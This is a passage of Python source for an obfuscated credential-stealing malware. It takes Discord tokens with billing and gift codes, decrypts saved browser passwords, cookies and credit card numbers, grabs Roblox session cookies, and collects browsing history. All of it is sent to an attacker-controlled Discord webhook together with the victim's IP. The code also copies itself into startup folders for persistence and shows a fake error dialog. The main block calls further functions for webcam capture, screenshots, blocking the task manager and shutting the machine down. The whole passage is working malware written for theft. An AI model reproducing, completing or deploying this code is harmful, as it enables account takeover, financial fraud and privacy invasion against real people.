                    p4ym3nt_m3th0d5_d15c0rd = ' / '.join(p4ym3nt_m3th0d5_d15c0rd)
                else:
                    p4ym3nt_m3th0d5_d15c0rd = "None"
            except:
                p4ym3nt_m3th0d5_d15c0rd = "None"

            try:
                gift_codes = requests.get('https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers={'Authorization': t0k3n_d15c0rd}).json()
                if gift_codes:
                    codes = []
                    for g1ft_c0d35_d15c0rd in gift_codes:
                        name = g1ft_c0d35_d15c0rd['promotion']['outbound_title']
                        g1ft_c0d35_d15c0rd = g1ft_c0d35_d15c0rd['code']
                        data = f"Gift: {name}\nCode: {g1ft_c0d35_d15c0rd}"
                        if len('\n\n'.join(g1ft_c0d35_d15c0rd)) + len(data) >= 1024:
                            break
                        codes.append(data)
                    if len(codes) > 0:
                        g1ft_c0d35_d15c0rd = '\n\n'.join(codes)
                    else:
                        g1ft_c0d35_d15c0rd = "None"
                else:
                    g1ft_c0d35_d15c0rd = "None"
            except:
                g1ft_c0d35_d15c0rd = "None"
        
            software_name, path = token_info.get(t0k3n_d15c0rd, ("Unknown Software", "Unknown location"))

            embed = Embed(title=f'Discord Token `{username_pc} "{ip_address_public}"`:', color=color_embed)
            embed.set_thumbnail(url=av4t4r_ur1_d15c0rd)
            embed.add_field(name=":file_folder: Path:", value=f"```{path}```", inline=False)
            embed.add_field(name=":package: Software:", value=f"```{software_name}```", inline=True)
            embed.add_field(name=":bust_in_silhouette: Username:", value=f"```{u53rn4m3_d15c0rd}```", inline=True)
            embed.add_field(name=":bust_in_silhouette: Display Name:", value=f"```{d15pl4y_n4m3_d15c0rd}```", inline=True)
            embed.add_field(name=":robot: Id:", value=f"```{us3r_1d_d15c0rd}```", inline=True)
            embed.add_field(name=":e_mail: Email:", value=f"```{em4i1_d15c0rd}```", inline=True)
            embed.add_field(name=":telephone_receiver: Phone:", value=f"```{ph0n3_d15c0rd}```", inline=True)   
            embed.add_field(name=":globe_with_meridians: Token:", value=f"```{t0k3n_d15c0rd}```", inline=True)
            embed.add_field(name=":rocket: Nitro:", value=f"```{n1tr0_d15c0rd}```", inline=True)
            embed.add_field(name=":earth_africa: Language:", value=f"```{c0untry_d15c0rd}```", inline=True)
            embed.add_field(name=":moneybag: Billing:", value=f"```{p4ym3nt_m3th0d5_d15c0rd}```", inline=True)
            embed.add_field(name=":gift: Gift Code:", value=f"```{g1ft_c0d35_d15c0rd}```", inline=True)
            embed.add_field(name=":lock: Multi-Factor Authentication:", value=f"```{mf4_d15c0rd}```", inline=True)
            embed.set_footer(text=footer_text, icon_url=avatar_embed)
            w3bh00k.send(embed=embed, username=username_embed, avatar_url=avatar_embed)

    upload_t0k3n5()

def Br0w53r_5t341():
    import os
    import shutil
    import json
    import base64
    import sqlite3
    import win32crypt
    from zipfile import ZipFile
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from discord import SyncWebhook, Embed, File
    from pathlib import Path

    PASSWORDS = []
    COOKIES = []
    HISTORY = []
    DOWNLOADS = []
    CARDS = []
    browsers = []

    def Br0ws53r_Main():
        appdata_local = os.getenv('LOCALAPPDATA')
        appdata_roaming = os.getenv('APPDATA')
        w3bh00k = SyncWebhook.from_url(w3bh00k_ur1)
            

        Browser = {
            'Google Chrome': os.path.join(appdata_local, 'Google', 'Chrome', 'User Data'),
            'Microsoft Edge': os.path.join(appdata_local, 'Microsoft', 'Edge', 'User Data'),
            'Opera': os.path.join(appdata_roaming, 'Opera Software', 'Opera Stable'),
            'Opera GX': os.path.join(appdata_roaming, 'Opera Software', 'Opera GX Stable'),
            'Brave': os.path.join(appdata_local, 'BraveSoftware', 'Brave-Browser', 'User Data'),
            'Vivaldi': os.path.join(appdata_local, 'Vivaldi', 'User Data'),
            'Internet Explorer': os.path.join(appdata_local, 'Microsoft', 'Internet Explorer'),
            'Amigo': os.path.join(appdata_local, 'Amigo', 'User Data'),
            'Torch': os.path.join(appdata_local, 'Torch', 'User Data'),
            'Kometa': os.path.join(appdata_local, 'Kometa', 'User Data'),
            'Orbitum': os.path.join(appdata_local, 'Orbitum', 'User Data'),
            'Cent Browser': os.path.join(appdata_local, 'CentBrowser', 'User Data'),
            '7Star': os.path.join(appdata_local, '7Star', '7Star', 'User Data'),
            'Sputnik': os.path.join(appdata_local, 'Sputnik', 'Sputnik', 'User Data'),
            'Vivaldi': os.path.join(appdata_local, 'Vivaldi', 'User Data'),
            'Google Chrome SxS': os.path.join(appdata_local, 'Google', 'Chrome SxS', 'User Data'),
            'Epic Privacy Browser': os.path.join(appdata_local, 'Epic Privacy Browser', 'User Data'),
            'Uran': os.path.join(appdata_local, 'uCozMedia', 'Uran', 'User Data'),
            'Yandex': os.path.join(appdata_local, 'Yandex', 'YandexBrowser', 'User Data'),
            'Iridium': os.path.join(appdata_local, 'Iridium', 'User Data'),
            'Mozilla Firefox': os.path.join(appdata_roaming, 'Mozilla', 'Firefox', 'Profiles'),
            'Safari': os.path.join(appdata_roaming, 'Apple Computer', 'Safari'),
        }

        profiles = [
            '', 'Default', 'Profile 1', 'Profile 2', 'Profile 3', 'Profile 4', 'Profile 5'
        ]

        for browser, path in Browser.items():
            if not os.path.exists(path):
                continue

            master_key = get_master_key(os.path.join(path, 'Local State'))
            if not master_key:
                continue

            for profile in profiles:
                profile_path = os.path.join(path, profile)
                if not os.path.exists(profile_path):
                    continue

                get_passwords(browser, path, profile_path, master_key)
                get_cookies(browser, path, profile_path, master_key)
                get_history(browser, path, profile_path)
                get_downloads(browser, path, profile_path)
                get_cards(browser, path, profile_path, master_key)

                if browser not in browsers:
                    browsers.append(browser)

        write_files(username_pc)
        send_files(username_pc, w3bh00k)
        clean_files(username_pc)

    def get_master_key(path):
        if not os.path.exists(path):
            return None

        try:
            with open(path, 'r', encoding='utf-8') as f:
                local_state = json.load(f)

            encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
            master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
            return master_key
        except:
            return None

    def decrypt_password(buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:-16]
            tag = buff[-16:]
            cipher = Cipher(algorithms.AES(master_key), modes.GCM(iv, tag))
            decryptor = cipher.decryptor()
            decrypted_pass = decryptor.update(payload) + decryptor.finalize()
            return decrypted_pass.decode()
        except:
            return None

    def list_tables(db_path):
        try:
            conn = sqlite3.connect(db_path)
            cursor = conn.cursor()
            cursor.execute("SELECT name FROM sqlite_master WHERE type='table';")
            tables = cursor.fetchall()
            conn.close()
            return tables
        except:
            return []

    def get_passwords(browser, path, profile_path, master_key):
        password_db = os.path.join(profile_path, 'Login Data')
        if not os.path.exists(password_db):
            return

        shutil.copy(password_db, 'password_db')
        tables = list_tables('password_db')

        conn = sqlite3.connect('password_db')
        cursor = conn.cursor()

        try:
            cursor.execute('SELECT action_url, username_value, password_value FROM logins')
            PASSWORDS.append(f"\n------------------------------| {browser} ({path}) |------------------------------\n")
            for row in cursor.fetchall():
                if not row[0] or not row[1] or not row[2]:
                    continue
                url =      f"- Url      : {row[0]}"
                username = f"  Username : {row[1]}"
                password = f"  Password : {decrypt_password(row[2], master_key)}"
                PASSWORDS.append(f"{url}\n{username}\n{password}\n")
        except:
            pass
        finally:
            conn.close()
            os.remove('password_db')

    def get_cookies(browser, path, profile_path, master_key):
        cookie_db = os.path.join(profile_path, 'Network', 'Cookies')
        if not os.path.exists(cookie_db):
            return

        conn = None 
        try:
            shutil.copy(cookie_db, 'cookie_db')
            conn = sqlite3.connect('cookie_db')
            cursor = conn.cursor()
            cursor.execute('SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies')
            COOKIES.append(f"\n------------------------------| {browser} ({path}) |------------------------------\n")
            for row in cursor.fetchall():
                if not row[0] or not row[1] or not row[2] or not row[3]:
                    continue
                url =    f"- Url    : {row[0]}"
                name =   f"  Name   : {row[1]}"
                path =   f"  Path   : {row[2]}"
                cookie = f"  Cookie : {decrypt_password(row[3], master_key)}"
                expire = f"  Expire : {row[4]}"
                COOKIES.append(f"{url}\n{name}\n{path}\n{cookie}\n{expire}\n")
        except:
            pass
        finally:
            if conn:
                conn.close()
            try:
                os.remove('cookie_db')
            except:
                pass


    def get_history(browser, path, profile_path):
        history_db = os.path.join(profile_path, 'History')
        if not os.path.exists(history_db):
            return

        shutil.copy(history_db, 'history_db')
        conn = sqlite3.connect('history_db')
        cursor = conn.cursor()
        cursor.execute('SELECT url, title, last_visit_time FROM urls')
        HISTORY.append(f"\n------------------------------| {browser} ({path}) |------------------------------\n")
        for row in cursor.fetchall():
            if not row[0] or not row[1] or not row[2]:
                continue
            url =   f"- Url   : {row[0]}"
            title = f"  Title : {row[1]}"
            time =  f"  Time  : {row[2]}"
            HISTORY.append(f"{url}\n{title}\n{time}\n")

        conn.close()
        os.remove('history_db')

    def get_downloads(browser, path, profile_path):
        downloads_db = os.path.join(profile_path, 'History')
        if not os.path.exists(downloads_db):
            return

        shutil.copy(downloads_db, 'downloads_db')
        conn = sqlite3.connect('downloads_db')
        cursor = conn.cursor()
        cursor.execute('SELECT tab_url, target_path FROM downloads')
        DOWNLOADS.append(f"\n------------------------------| {browser} ({path}) |------------------------------\n")
        for row in cursor.fetchall():
            if not row[0] or not row[1]:
                continue
            path = f"- Path : {row[1]}"
            url =  f"  Url  : {row[0]}"
            DOWNLOADS.append(f"{path}\n{url}\n")

        conn.close()
        os.remove('downloads_db')

    def get_cards(browser, path, profile_path, master_key):
        cards_db = os.path.join(profile_path, 'Web Data')
        if not os.path.exists(cards_db):
            return

        shutil.copy(cards_db, 'cards_db')
        conn = sqlite3.connect('cards_db')
        cursor = conn.cursor()
        cursor.execute('SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')
        CARDS.append(f"\n------------------------------| {browser} ({path}) |------------------------------\n")
        for row in cursor.fetchall():
            if not row[0] or not row[1] or not row[2] or not row[3]:
                continue
            name =             f"- Name             : {row[0]}"
            expiration_month = f"  Expiration Month : {row[1]}"
            expiration_year =  f"  Expiration Year  : {row[2]}"
            card_number =      f"  Card Number      : {decrypt_password(row[3], master_key)}"
            date_modified =    f"  Date Modified    : {row[4]}"
            CARDS.append(f"{name}\n{expiration_month}\n{expiration_year}\n{card_number}\n{date_modified}\n")

        conn.close()
        os.remove('cards_db')

    def write_files(username_pc):
        os.makedirs(f"Browser_{username_pc}", exist_ok=True)

        if PASSWORDS:
            with open(f"Browser_{username_pc}\\Passwords_{username_pc}.txt", "w", encoding="utf-8") as f:
                f.write('\n'.join(PASSWORDS))

        if COOKIES:
            with open(f"Browser_{username_pc}\\Cookies_{username_pc}.txt", "w", encoding="utf-8") as f:
                f.write('\n'.join(COOKIES))

        if HISTORY:
            with open(f"Browser_{username_pc}\\History_{username_pc}.txt", "w", encoding="utf-8") as f:
                f.write('\n'.join(HISTORY))

        if DOWNLOADS:
            with open(f"Browser_{username_pc}\\Downloads_{username_pc}.txt", "w", encoding="utf-8") as f:
                f.write('\n'.join(DOWNLOADS))

        if CARDS:
            with open(f"Browser_{username_pc}\\Cards_{username_pc}.txt", "w", encoding="utf-8") as f:
                f.write('\n'.join(CARDS))

        with ZipFile(f"Browser_{username_pc}.zip", "w") as zipf:
            for file in os.listdir(f"Browser_{username_pc}"):
                zipf.write(os.path.join(f"Browser_{username_pc}", file), file)

    def send_files(username_pc, w3bh00k):
        w3bh00k.send(
            embed=Embed(
                title=f'Browser Steal  `{username_pc} "{ip_address_public}"`:',
                description=f"Found In **{'**, **'.join(browsers)}**:```" + '\n'.join(tree(Path(f"Browser_{username_pc}"))) + "```",
                color=color_embed,
            ).set_footer(
                text=footer_text,
                icon_url=avatar_embed
            ),
            file=File(fp=f"Browser_{username_pc}.zip", filename=f"Browser_{username_pc}.zip"), username=username_embed, avatar_url=avatar_embed
        )

    def clean_files(username_pc):
        shutil.rmtree(f"Browser_{username_pc}")
        os.remove(f"Browser_{username_pc}.zip")

    def tree(path: Path, prefix: str = '', midfix_folder: str = '📂 - ', midfix_file: str = '📄 - '):
        pipes = {
            'space':  '    ',
            'branch': '│   ',
            'tee':    '├── ',
            'last':   '└── ',
        }

        if prefix == '':
            yield midfix_folder + path.name

        contents = list(path.iterdir())
        pointers = [pipes['tee']] * (len(contents) - 1) + [pipes['last']]
        for pointer, path in zip(pointers, contents):
            if path.is_dir():
                yield f"{prefix}{pointer}{midfix_folder}{path.name} ({len(list(path.glob('**/*')))} files, {sum(f.stat().st_size for f in path.glob('**/*') if f.is_file()) / 1024:.2f} kb)"
                extension = pipes['branch'] if pointer == pipes['tee'] else pipes['space']
                yield from tree(path, prefix=prefix+extension)
            else:
                yield f"{prefix}{pointer}{midfix_file}{path.name} ({path.stat().st_size / 1024:.2f} kb)"
    Br0ws53r_Main()

def R0b10x_C00ki3():
    import browser_cookie3
    import requests
    import json
    from discord import SyncWebhook, Embed
    import discord

    c00ki35_list = []
    def g3t_c00ki3_4nd_n4vig4t0r(br0ws3r_functi0n):
        try:
            c00kie5 = br0ws3r_functi0n()
            c00kie5 = str(c00kie5)
            c00kie = c00kie5.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].strip()
            n4vigator = br0ws3r_functi0n.__name__
            return c00kie, n4vigator
        except:
            return None, None

    def Microsoft_Edge():
        return browser_cookie3.edge(domain_name="roblox.com")

    def Google_Chrome():
        return browser_cookie3.chrome(domain_name="roblox.com")

    def Firefox():
        return browser_cookie3.firefox(domain_name="roblox.com")

    def Opera():
        return browser_cookie3.opera(domain_name="roblox.com")
    
    def Opera_GX():
        return browser_cookie3.opera_gx(domain_name="roblox.com")

    def Safari():
        return browser_cookie3.safari(domain_name="roblox.com")

    def Brave():
        return browser_cookie3.brave(domain_name="roblox.com")

    br0ws3r5 = [Microsoft_Edge, Google_Chrome, Firefox, Opera, Opera_GX, Safari, Brave]
    for br0ws3r in br0ws3r5:
        c00ki3, n4vigator = g3t_c00ki3_4nd_n4vig4t0r(br0ws3r)
        if c00ki3:
            if c00ki3 not in c00ki35_list:
                c00ki35_list.append(c00ki3)
                try:
                    inf0 = requests.get("https://www.roblox.com/mobileapi/userinfo", cookies={".ROBLOSECURITY": c00ki3})
                    api = json.loads(inf0.text)
                except:
                    pass

                us3r_1d_r0b10x = api.get('id', "None")
                d1spl4y_nam3_r0b10x = api.get('displayName', "None")
                us3rn4m3_r0b10x = api.get('name', "None")
                r0bux_r0b10x = api.get("RobuxBalance", "None")
                pr3mium_r0b10x = api.get("IsPremium", "None")
                av4t4r_r0b10x = api.get("ThumbnailUrl", "None")
                bui1d3r5_c1ub_r0b10x = api.get("IsAnyBuildersClubMember", "None")
        
                size_c00ki3 = len(c00ki3)
                middle_c00ki3 = size_c00ki3 // 2
                c00ki3_part1 = c00ki3[:middle_c00ki3]
                c00ki3_part2 = c00ki3[middle_c00ki3:]

                w3bh00k = SyncWebhook.from_url(w3bh00k_ur1)

                embed = discord.Embed(
                    title=f'Roblox Cookie `{username_pc} "{ip_address_public}"`:',
                    color=color_embed
                )
                embed.set_footer(text=footer_text, icon_url=avatar_embed)
                embed.set_thumbnail(url=av4t4r_r0b10x)
                embed.add_field(name=":compass: Navigator:", value=f"```{n4vigator}```", inline=True)
                embed.add_field(name=":bust_in_silhouette: Username:", value=f"```{us3rn4m3_r0b10x}```", inline=True)
                embed.add_field(name=":bust_in_silhouette: DisplayName:", value=f"```{d1spl4y_nam3_r0b10x}```", inline=True)
                embed.add_field(name=":robot: Id:", value=f"```{us3r_1d_r0b10x}```", inline=True)
                embed.add_field(name=":moneybag: Robux:", value=f"```{r0bux_r0b10x}```", inline=True)
                embed.add_field(name=":tickets: Premium:", value=f"```{pr3mium_r0b10x}```", inline=True)
                embed.add_field(name=":construction_site: Builders Club:", value=f"```{bui1d3r5_c1ub_r0b10x}```", inline=True)
                embed.add_field(name=":cookie: Cookie Part 1:", value=f"```{c00ki3_part1}```", inline=False)
                embed.add_field(name=":cookie: Cookie Part 2:", value=f"```{c00ki3_part2}```", inline=False)

                w3bh00k.send(embed=embed, username=username_embed,
                                avatar_url=avatar_embed)
                
    if not c00ki35_list:
        w3bh00k = SyncWebhook.from_url(w3bh00k_ur1)
        embed = Embed(
            title=f'Roblox Cookie `{username_pc} "{ip_address_public}"`:', 
            description=f"No roblox cookie found.",
            color=color_embed)
        embed.set_footer(text=footer_text, icon_url=avatar_embed)
        w3bh00k.send(embed=embed, username=username_embed, avatar_url=avatar_embed)

def F4k3_3rr0r():
    import tkinter as tk
    from tkinter import messagebox
    root = tk.Tk()
    root.withdraw()
    messagebox.showerror("Error", "Error")

def St4rtup():
    import os
    import sys
    import shutil

    try:
        file_path = os.path.abspath(sys.argv[0])

        if file_path.endswith(".exe"):
            ext = "exe"
        elif file_path.endswith(".py"):
            ext = "py"

        new_name = f"ㅤ.{ext}"

        if sys.platform.startswith('win'):  
            folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        elif sys.platform.startswith('darwin'): 
            folder = os.path.join(os.path.expanduser('~'), 'Library', 'LaunchAgents')
        elif sys.platform.startswith('linux'):
            folder = os.path.join(os.path.expanduser('~'), '.config', 'autostart')
        path_new_file = os.path.join(folder, new_name)

        shutil.copy(file_path, path_new_file)
        os.chmod(path_new_file, 0o777) 
    except:
        pass

payload = {
    'content': f'****╔═════════════════Victim Affected═════════════════╗****',
    'username': username_embed,
    'avatar_url': avatar_embed,
}
requests.post(w3bh00k_ur1, json=payload)
try: B10ck_K3y()
except: pass
try: B10ck_T45k_M4n4g3r()
except: pass
try: B10ck_W3b5it3()
except: pass
try: St4rtup()
except: pass
try: Sy5t3m_Inf0()
except: pass
try: Di5c0rd_T0k3n()
except: pass
try: Di5c0rd_inj3c710n()
except: pass
try: Br0w53r_5t341()
except: pass
try: R0b10x_C00ki3()
except: pass
try: C4m3r4_C4ptur3()
except: pass
try: Op3n_U53r_Pr0fi13_53tting5()
except: pass
try: Scr33n5h0t()
except: pass
payload = {
    'content': f'****╚══════════════════{ip_address_public}══════════════════╝****',
    'username': username_embed,
    'avatar_url': avatar_embed,
}
requests.post(w3bh00k_ur1, json=payload)

try: F4k3_3rr0r()
except: pass
try: Shutd0wn()
except: pass
